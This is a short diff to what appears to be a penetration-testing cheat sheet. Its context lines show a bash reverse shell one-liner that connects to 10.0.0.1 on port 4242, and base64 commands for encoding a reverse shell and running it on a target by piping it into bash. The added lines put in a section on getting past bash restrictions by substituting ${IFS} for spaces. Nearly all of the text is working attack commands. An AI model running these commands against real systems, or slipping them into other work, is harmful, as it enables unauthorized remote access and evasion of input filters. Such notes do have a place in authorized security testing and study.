@@ -23,6 +23,14 @@ and try them out on target machine
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 ```
+## ENCODING STUFF
+
+### replace bad char
+>see https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions
+```bash
+space : ${IFS}
+```
+
 ### base 64 encoding
 craft encoded rs: `echo -n "[REVERSE SHELL]" | base64 -w 0`\
 inject encoded rs on target: `echo -n [ENCODED REVERSE SHELL] | base64 -d | bash`
